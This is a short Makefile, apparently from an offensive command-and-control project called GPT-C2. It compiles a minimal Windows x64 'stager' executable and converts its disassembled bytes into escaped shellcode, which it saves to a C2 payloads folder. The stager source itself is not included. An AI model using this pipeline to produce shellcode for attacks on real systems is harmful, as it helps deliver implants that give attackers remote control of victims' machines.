make:
	nasm -f win64 stager_entrypoint.asm -o stager_entrypoint.o
	x86_64-w64-mingw32-gcc stager_asm.c -Wall -m64 -ffunction-sections -fno-asynchronous-unwind-tables -nostdlib -fno-ident -O2 -c -o stager_asm.o -Wl,-Tstager_linker.ld,--no-seh
	x86_64-w64-mingw32-ld -s stager_entrypoint.o stager_asm.o -o stager.exe
	
	# for i in $(objdump -d stager.exe |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
	# x86_64-w64-mingw32-gcc exec.c -m64 -o exec.exe -s
	

	@for i in $$(objdump -d stager.exe | grep "^ " | cut -f2); do \
		echo -n "\\x$$i"; \
		done > /home/kali/Desktop/c2/GPT-C2/payloads/shellcode.txt; \
		echo 	

	# rm -rf stager_entrypoint.o stager_asm.o stager.exe 
	